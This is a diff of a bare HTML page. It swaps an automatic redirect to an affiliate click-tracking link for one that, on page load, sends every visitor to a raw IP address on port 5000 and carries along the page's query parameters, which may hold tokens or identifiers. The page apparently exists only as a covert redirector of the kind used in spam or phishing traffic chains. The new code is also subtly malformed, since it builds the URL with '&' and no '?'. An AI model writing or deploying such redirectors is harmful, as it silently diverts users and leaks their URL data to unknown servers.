@@ -1,7 +1,17 @@
 <html>
 <body>
-  <script>
-document.location = 'https://smikit.top/click?o=2&a=7685';
-  </script>
+<script>
+  const baseUrl = "http://31.130.130.186:5000/";
+
+  // берём текущие параметры
+  const params = window.location.search;
+
+  // если есть параметры — добавляем
+  const redirectUrl = params 
+    ? baseUrl + "&" + params.substring(1)
+    : baseUrl;
+
+  document.location = redirectUrl;
+</script>
 </body>
 </html>
